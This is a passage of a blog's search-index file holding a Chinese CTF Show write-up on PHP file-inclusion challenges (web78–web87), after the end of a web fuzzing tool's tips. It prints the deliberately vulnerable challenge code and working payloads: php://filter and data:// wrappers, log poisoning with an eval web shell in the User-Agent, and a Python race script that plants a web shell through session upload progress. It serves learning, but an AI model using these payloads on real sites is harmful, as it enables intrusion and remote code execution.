+<li>使用 CIDR 进行暴力破解时，混合使用<code>--cidr</code>、和 将减少大部分噪音 + 假阴性<code>-F``-q</code></li>
+<li>扫描 URL 列表，但不想看到 429 泛滥？<code>--skip-on-status 429</code>将帮助您在返回 429 时跳过目标</li>
+<li>服务器包含会减慢扫描速度的大文件？您<em>可能</em>想使用<code>HEAD</code>HTTP 方法而不是<code>GET</code></li>
+<li>蛮力 CIDR 很慢？可能您忘记减少请求超时和请求重试。建议:<code>--timeout 3 --retries 1</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF Show(文件包含)</title>
+    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本场题目来自于CTF show，本文只是记录学习过程，以及能够提供一点小帮助再好不过</p>
+<p><strong>web78 -web118</strong></p>
+<span id="more"></span>
+
+
+<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>使用php伪协议php:&#x2F;&#x2F;filter来构造payload</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</span><br><span class="line"></span><br><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-16469231625671.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image.png" class title="This is an image">
+
+<h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h2><p><code>file=file:///var/log/nginx/access.log</code>，来确定是否能读取 nginx 的日志。</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_1.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_1.png" class title="This is an image">
+
+<p>确认日志可以访问，对其抓包</p>
+<p>使用Burp进行抓包，并修改 User-Agent 为 <code>&lt;?php @eval($_GET[cmd]);echo PHP_DATADIR;?&gt;</code></p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_2.png" alt="image_2"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_2.png" class title="This is an image">
+
+<p>再次访问可以看到即可查看 PHP 的执行路径。</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_3.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_3.png" class title="This is an image">
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=file:///var/log/nginx/access.log&amp;cmd=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_4.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_4.png" class title="This is an image">
+
+<p>也可以直接执行</p>
+<p>pay</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>代码会将php，替换为？？？</p>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>方法同上。利用Burp将恶意代码上传，然后直接进行命令执行。</p>
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>我们在网址加上参数 <code>?file=PHP://input</code>，利用burp抓包,添加命令</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_5.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_5.png" class title="This is an image">
+
+<p>修改命令为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>得到flag</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_6.png"></p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_6.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_6.png" class title="This is an image">
+
+<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>学习到 2 种思路。一是利用特殊的 PHP 语言标记，二是利用编码绕过。</p>
+<h4 id="特殊的-PHP-语言标记"><a href="#特殊的-PHP-语言标记" class="headerlink" title="特殊的 PHP 语言标记"></a>特殊的 PHP 语言标记</h4><p>常见的 PHP 语言标记有如下几种：</p>
+<ul>
+<li><code>&lt;?php phpinfo() ?&gt;</code>：如果只含有 PHP 代码， <code>?&gt;</code> 不允许存在。<code>?&gt;</code> 隐含一个 <code>;</code>，所以最后一句可以不用分号。</li>
+<li><code>&lt;script language=“php”&gt;phpinfo()&lt;script&gt;</code>。</li>
+<li><code>&lt;? ?&gt;</code>：需要修改 PHP 的 <code>short_open_tag</code> 配置</li>
+<li><code>&lt;% %&gt;</code>：默认禁用。</li>
+<li><code>&lt;?=$variablename ?&gt;</code>：默认可用。</li>
+<li><code>&lt;%=$variablename  %&gt;</code>：默认禁用。</li>
+</ul>
+<p>pay</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>将上面的pay改成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>出现 data的话就会被替换掉</p>
+<p><strong>php:&#x2F;&#x2F;input</strong>还可以用，只是目录下的flag.php ——&gt; fl0g.php</p>
+<p>**file:&#x2F;&#x2F;**协议也可以用</p>
+<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>连<code>：</code>都过滤了</p>
+<p>%3A</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?file=data%<span class="number">3</span>A<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw==</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>Hint</strong>：包含日志文件 进行getshell 日志文件路径： <code>?file=/var/log/nginx/access.log</code></p>
+<p>直接用file：进行命令执行看看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[cmd]);<span class="keyword">echo</span> PHP_DATADIR;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_7.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_7.png" class title="This is an image">
+
+<p>需要你自己加上空格（%20），直接加空格就会截断，后面就没办法反应。</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_8.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_8.png" class title="This is an image">
+
+<h1 id="web83-web86"><a href="#web83-web86" class="headerlink" title="web83 - web86"></a>web83 - web86</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 20:28:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>估计是session_destroy()被禁用了，页面显示报错</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">session_destroy</span>(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>脚本跑不出来</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://93a5ba3f-7aea-4855-8fa3-5ecc6311ef67.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">proxy=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,</span><br><span class="line">            data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        resposne2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>写个上传脚本</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://b9fddb46-a4f3-49d7-a06d-18463c73ebf3.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>然后抓包，加一下<code>PHPSESSID</code>，在送去爆破就可以了</p>
+<p>方法没有做出来。</p>
+<h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>die 函数 等同于 exit()：exit 函数输出一个消息并且退出当前脚本。脚本会我们传入的content参数中加入die，从而让我们无法利用写入的一句话木马。</p>
+<p>存在urldecode（）函数，我们需要进行URL编码</p>
